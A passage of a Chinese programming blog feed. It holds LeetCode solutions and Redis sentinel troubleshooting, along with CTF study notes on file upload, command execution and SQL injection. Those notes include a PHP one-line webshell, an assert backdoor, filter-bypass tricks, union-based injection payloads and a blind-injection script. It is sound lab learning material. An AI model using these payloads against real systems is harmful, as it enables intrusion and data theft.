class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">partition</span><span class="params">(ListNode head, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">      <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), dummy2 = <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p1 = dummy1, p2 = dummy2;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt; x) &#123;</span><br><span class="line">                p1.next = p;</span><br><span class="line">                p1 = p1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2.next = p;</span><br><span class="line">                p2 = p2.next;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 断开链</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> p.next;</span><br><span class="line">            p.next = <span class="literal">null</span>;</span><br><span class="line">            p = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p1.next = dummy2.next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy1.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github稳定访问工具</title>
      <link href="/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>目前在用稳定工具，<a href="https://gitee.com/XingYuan55/FastGithub/releases/tag/2.1.4">FastGithub</a></p><p><a href="https://github.com/dotnetcore/FastGithub">源地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>No.3 无重复字符的最长字串</title>
      <link href="/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/"/>
      <url>/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>中等题目</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 最长子串 的长度。</p><span id="more"></span><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br><span class="line"></span><br><span class="line">示例 3:</span><br><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">    请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">0 &lt;= s.length &lt;= 5 * 10^4 </span><br><span class="line">s 由英文字母、数字、符号和空格组成</span><br></pre></td></tr></table></figure><h5 id="最开始解法"><a href="#最开始解法" class="headerlink" title="最开始解法"></a>最开始解法</h5><p>初步判断为滑动窗口，记录最长字串和最长长度，然后不断右移和缩动窗口</p><p>技术栈：<br>字符串分割 <code>String.substring(prev, last)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">subs</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">findIndex</span> <span class="operator">=</span> subs.indexOf(String.valueOf(c));</span><br><span class="line">            <span class="keyword">if</span> (findIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                subs += c;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">                subs = subs.substring(findIndex + <span class="number">1</span>, subs.length()) + c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 12ms</p><h5 id="使用滑动窗口框架解法"><a href="#使用滑动窗口框架解法" class="headerlink" title="使用滑动窗口框架解法"></a>使用滑动窗口框架解法</h5><p>使用hash记录字符出现次数，出现重复字符则滑动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">            right++;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (window.get(c) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">lc</span> <span class="operator">=</span> s.charAt(left); </span><br><span class="line">                left ++;</span><br><span class="line">                window.put(lc, window.get(lc) -<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ans = Math.max(ans, right - left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 6ms</p>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 滑动窗口 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 滑动窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis哨兵模式启动和异常排查</title>
      <link href="/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。</p><span id="more"></span><h2 id="常用涉及redis哨兵模式的命令"><a href="#常用涉及redis哨兵模式的命令" class="headerlink" title="常用涉及redis哨兵模式的命令"></a>常用涉及redis哨兵模式的命令</h2><h3 id="1-查看哨兵模式状态"><a href="#1-查看哨兵模式状态" class="headerlink" title="1.查看哨兵模式状态"></a>1.查看哨兵模式状态</h3><p>假设系统集群中的三台服务器为 x.x.60.11、x.x.60.12、x.x.60.13,其中60.12为集群主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>查看哨兵模式状态的<code>别名</code>是否正确，状态（<code>status</code>）是否<code>ok</code>，<code>address</code>是否指向<code>x.x.60.12</code>，如果都正常则无异常。</p><h3 id="2-查看进程中-redis-的服务"><a href="#2-查看进程中-redis-的服务" class="headerlink" title="2.查看进程中 redis 的服务"></a>2.查看进程中 redis 的服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure><p>正常情况下会存在两个进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UID       PID       PPID      C     STIME    TTY       TIME         CMD</span><br><span class="line">zheng     6788      0         0     00:00    pts/0      00:00:00     redis-server</span><br><span class="line">zheng     6789      0         0     00:00    pts/0      00:00:00     redis-sentinel</span><br></pre></td></tr></table></figure><h3 id="3-关闭哨兵模式服务"><a href="#3-关闭哨兵模式服务" class="headerlink" title="3.关闭哨兵模式服务"></a>3.关闭哨兵模式服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 6788 6789 <span class="comment">#上述的进程号</span></span><br></pre></td></tr></table></figure><h3 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4.启动服务"></a>4.启动服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-server redis.conf</span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><h2 id="排查-redis-哨兵模式异常情况"><a href="#排查-redis-哨兵模式异常情况" class="headerlink" title="排查 redis 哨兵模式异常情况"></a>排查 redis 哨兵模式异常情况</h2><h3 id="1-检查哨兵模式状态"><a href="#1-检查哨兵模式状态" class="headerlink" title="1.检查哨兵模式状态"></a>1.检查哨兵模式状态</h3><p>ps：ip 地址分别更改为三台服务器的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>如果某台服务器<code>status</code>为<code>odown</code>，或者<code>address</code>指向不为<code>x.x.60.12</code>,则说明集群出现问题，需要重启集群。</p><h3 id="2-检查哨兵模式配置文件是否正常"><a href="#2-检查哨兵模式配置文件是否正常" class="headerlink" title="2.检查哨兵模式配置文件是否正常"></a>2.检查哨兵模式配置文件是否正常</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看每台服务器的 sentinel.conf 配置文件</span></span><br><span class="line">vi sentinel.conf</span><br></pre></td></tr></table></figure><p>查看 <code>sentinel monitor redismaster &quot;ip地址&quot; 6379 0</code>,检查 ip 地址是否为主机地址，如果不为该值则说明<code>sentinel</code> 有误，<strong>在 <code>redis</code> 的服务都暂时的情况下再修改配置文件，修改该ip地址为主机地址，然后保存</strong>。</p><h3 id="排查完如上问题，重启服务"><a href="#排查完如上问题，重启服务" class="headerlink" title="排查完如上问题，重启服务"></a>排查完如上问题，重启服务</h3><p>启动顺序，** 优先启动主机的服务 **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 redis</span></span><br><span class="line">./redis-server redis.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>redis</code></p><p>然后再启动哨兵模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 sentinel</span></span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>sentinel</code></p><h3 id="查询状态"><a href="#查询状态" class="headerlink" title="查询状态"></a>查询状态</h3><p>在三台服务器中输入 <code>ps -ef | grep redis</code>，如果存在两个 <code>redis</code> 进程则说明应用启动正常。<br>然后分别在三台服务器输入 <code>./redis-cli -h 当前服务器ip地址 -p 26379 INFO</code>，如果别名、状态、指向地址都正确，则说明哨兵模式正常。</p><p>然后可以通过应用验证 <code>redis</code> 是否恢复完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF - 文件上传</title>
      <link href="/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>文件上传分为前端验证和后端验证，前端校验即 <code>js</code> 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。</p><span id="more"></span><h2 id="黑名单-白名单"><a href="#黑名单-白名单" class="headerlink" title="黑名单 白名单"></a>黑名单 白名单</h2><ul><li>黑名单：不允许我上传什么样的文件 <code>php | html</code></li><li>白名单：仅允许我们上传什么样的文件 <code>png | jpg | gif</code></li></ul><h2 id="前端校验式文件上传"><a href="#前端校验式文件上传" class="headerlink" title="前端校验式文件上传"></a>前端校验式文件上传</h2><p>如果是前端请求被拦截，使用 <code>burpsuit</code>，直接修改文件格式为 <code>.php</code>,修改内容为一句话木马 <code>&lt;?php eval($POST[&#39;xxx&#39;];)?&gt;</code>，然后访问对应 <code>php</code> 文件，发送 <code>post</code> 请求加上参数。通过参数执行指令 <code>xxx=system(&#39;ls&#39;)</code>，执行命令找到 <code>flag</code> 然后 <code>tac</code> 输出。</p><h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><p>当前目录 <code>301</code> <code>302</code> 跳转，判断该目录下的文件解析类型</p><ul><li>包含ccc</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;filename&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>文件类型 <code>. .asd .htaccess</code></li></ul><p>上传上面类型的文件，然后就可以上传对应 <code>filename</code> 后缀的文件了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF - 代码执行</title>
      <link href="/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/20/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>代码执行类的题目，如在指定时间内计算给定方程的数值，方程题一般时间人工计算会超时，只能通过抓取页面内的方程，然后通过代码执行的方式计算好然后提交来解决；或给定一串 <code>php</code> 代码，通过指定变量输入系统指令执行代码获取目录和读取 <code>flag</code> 里的内容。</p><span id="more"></span><h2 id="获取页面信息包"><a href="#获取页面信息包" class="headerlink" title="获取页面信息包"></a>获取页面信息包</h2><ul><li>1.quests包 pip install获取，获取页面信息包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sess = requests.session()</span><br><span class="line">req = sess.get(url)</span><br></pre></td></tr></table></figure><ul><li>2.通过 re 正则表达式截取内容，通过(.<em>) 即 (.</em>?)匹配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">&quot;the answer is:(.*)&lt;/br&gt; a=(.*)&lt;/br&gt; b=(.*?)&lt;/br&gt;&quot;</span></span><br><span class="line">result = re.search(pattern, req.text)</span><br></pre></td></tr></table></figure><ul><li>3.然后可获取匹配到值，通过eval()函数计算数值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="built_in">int</span>(result.group(<span class="number">2</span>)), <span class="built_in">int</span>(result.group(<span class="number">3</span>))</span><br><span class="line">result = <span class="built_in">eval</span>(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">4.</span>通过post发送请求获取 答案</span><br><span class="line">data = &#123; <span class="string">&#x27;answer&#x27;</span>: result &#125;</span><br><span class="line">rsp = sess.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(rsp.text)</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>如给定一串代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过发送 <code>post</code> 请求传参，传入 <code>phpinfo()</code> 或者系统命令执行相关命令来获取 <code>flag</code>。</p><h3 id="linux中，-和-和-的区别"><a href="#linux中，-和-和-的区别" class="headerlink" title="linux中，&amp;和&amp;&amp;,|和||的区别"></a>linux中，&amp;和&amp;&amp;,|和||的区别</h3><ul><li><p><code>&amp;</code> 表示任务在后台执行，如要在后台运行 <code>redis-server</code>,则有 <code>redis-server &amp;</code></p></li><li><p><code>&amp;&amp;</code> 表示前一条命令执行成功时，才执行后一条命令 ，如 <code>echo &#39;1‘ &amp;&amp; echo &#39;2&#39;</code>    </p></li><li><p><code>|</code> 表示管道，上一条命令的输出，作为下一条命令参数，如 <code>echo &#39;yes&#39; | wc -l</code></p></li><li><p><code>||</code> 表示上一条命令执行失败后，才执行下一条命令，如 <code>cat nofile || echo &quot;fail&quot;</code></p></li><li><p><code>|</code> 被过滤 用换行符 <code>%0a</code></p></li></ul><h3 id="空格绕过技巧"><a href="#空格绕过技巧" class="headerlink" title="空格绕过技巧"></a>空格绕过技巧</h3><p>命令执行时，后台函数可能会过滤掉空格等特殊字符，可通过如下方式绕过过滤</p><ul><li>${IFS} </li><li>&lt; &lt;&gt;</li><li>%09 </li><li>{cat, 1.txt}</li><li>.\</li><li>%CommonProgramFilesL~10,1%</li></ul><h3 id="判断服务器为linux或windows"><a href="#判断服务器为linux或windows" class="headerlink" title="判断服务器为linux或windows"></a>判断服务器为linux或windows</h3><ul><li><code>windows</code> 对大小写不敏感，将 <code>x</code> 改为 <code>X</code>，如果不变，则为 <code>windows</code></li><li><code>windows</code> 查看文件使用指令 <code>type</code>,</li></ul><h3 id="文件名绕过技巧"><a href="#文件名绕过技巧" class="headerlink" title="文件名绕过技巧"></a>文件名绕过技巧</h3><p>如 <code>flag</code> 文件被绕过，可通过如下方法绕过</p><ul><li><p><code>nl / fl``ag, nl / fl[a-z]g, a=fl;b=ag;nl /$a%b</code></p></li><li><p><code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li><li><p><code>echo cat /flag|base64</code>，<code>echo base64字符串 | base64 -d</code> 通过 <code>base64</code> 加密后再解密</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF -  sql注入</title>
      <link href="/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/20/CTF-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sql 注入的题目，出现在登录、注册、查询信息类的题目，涉及前端、后端、数据库（mysql）等知识点。</p><span id="more"></span><p>sql注入类别分为：联合注入、报错注入、布尔盲注、时间盲注。</p><h2 id="联合盲注"><a href="#联合盲注" class="headerlink" title="联合盲注"></a>联合盲注</h2><p>联合盲注即通过找注入点，然后通过 <code>union</code> 联合查询语句找到数据库中想要的值，联合查询即保证和前面的select语句有相同字段数，判断select 语句的字段数，order by 判断字段数，查找有多少个库，有多少个表，有什么字段。</p><h3 id="1-判断是否有注入点"><a href="#1-判断是否有注入点" class="headerlink" title="1.判断是否有注入点"></a>1.判断是否有注入点</h3><ul><li>通过单引号 <code>&#39;</code> 判断是否有注入点</li><li>注入点多试以下符号： <code>&#39;</code> <code>&quot;</code> <code>)</code> <code>&#39;)</code></li></ul><h3 id="2-注入点是字符型还是数字型？"><a href="#2-注入点是字符型还是数字型？" class="headerlink" title="2.注入点是字符型还是数字型？"></a>2.注入点是字符型还是数字型？</h3><ul><li><code>id=1 and 1=1和id=1 and 1=2</code> 页面无变化，说明注入点不是整形；如果注入点为整形，则直接加入 <code>sql</code> 注入语句即可</li><li><code>id =1 &#39; and 1=1 %23,  id =1 &#39; and 1=2 %23</code>，说明注入类型为字符</li></ul><h3 id="3-判断输出内容有多少列"><a href="#3-判断输出内容有多少列" class="headerlink" title="3.判断输出内容有多少列"></a>3.判断输出内容有多少列</h3><p>判断字段数 <code>id=&#39;order by 5 -- -&#39;</code>, 如果字段为 <code>5</code> 则输出正常，输入<code>order by 6%23</code> 发现页面错误，说明没有 <code>6</code> 列，输入 <code>5</code> 正确，说明有<code>5</code> 列。</p><h3 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h3><p>查看页面显示的字段是第几位，<code>id=&#39;union select 1,2,3,4,5 %23</code>，查看显示数字是第几位</p><h3 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" title="5.获取所有数据库名"></a>5.获取所有数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;union select 1,2,select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA,4,5%23</span></span><br></pre></td></tr></table></figure><p>得到两个数据库 <code>information_schema, sq01</code></p><h3 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>SQL01<span class="string">&#x27;),3%23</span></span><br></pre></td></tr></table></figure><p>得到表名 <code>users</code></p><h3 id="7-获取列名"><a href="#7-获取列名" class="headerlink" title="7.获取列名"></a>7.获取列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3,4,5%23</span></span><br></pre></td></tr></table></figure><h3 id="8-然后根据表名和列名查询想要的数据"><a href="#8-然后根据表名和列名查询想要的数据" class="headerlink" title="8.然后根据表名和列名查询想要的数据"></a>8.然后根据表名和列名查询想要的数据</h3><h3 id="9-sql关键字被过滤的解决方法"><a href="#9-sql关键字被过滤的解决方法" class="headerlink" title="9.sql关键字被过滤的解决方法"></a>9.sql关键字被过滤的解决方法</h3><ul><li>通过将关键字重复写两遍，如<code>select</code> 换为 <code>seselectlect</code></li><li><code>#</code> 被注释 换成 <code>-- -&#39;</code></li><li><code>&#39;</code> 被过滤，换成 <code>%df\</code>:表示中文字符，<code>%df</code> 表示 <code>‘运</code>，或者尝试 <code>%df</code> 然后再加 <code>&#39;</code></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>当注入点没有提示信息返回，只有and 1&#x3D;1 或者 1&#x3D;2不相同提示时，可通过布尔盲注。<br>通过撞字符获取数据库中的 <code>flag</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=1&#x27;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = url + <span class="string">&quot;and hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        rsp = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;SangFor&quot;</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            flag = flag + char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注，当注入点没有其他提示信息返回时，通过布尔盲注也没有信息提示时，但是 and sleep(5) 页面有等待，说明存在时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 